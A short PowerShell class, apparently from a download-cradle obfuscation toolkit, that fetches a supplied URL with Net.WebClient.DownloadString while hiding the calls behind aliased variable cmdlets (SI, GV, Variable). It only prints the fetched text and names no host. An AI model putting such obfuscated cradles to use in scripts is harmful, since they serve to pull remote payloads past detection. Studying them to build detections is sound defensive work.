Class ObfDownloadFileContent3 {

    static Execute ([String]$url) {
        #CLI:  Memory\PsWebString\Rearrange\3
        SI Variable:\5U $url;Set-Item Variable:/B (New-Object Net.WebClient);
        Write-Host (GV B).Value.DownloadString((Variable 5U -Value));
    }

}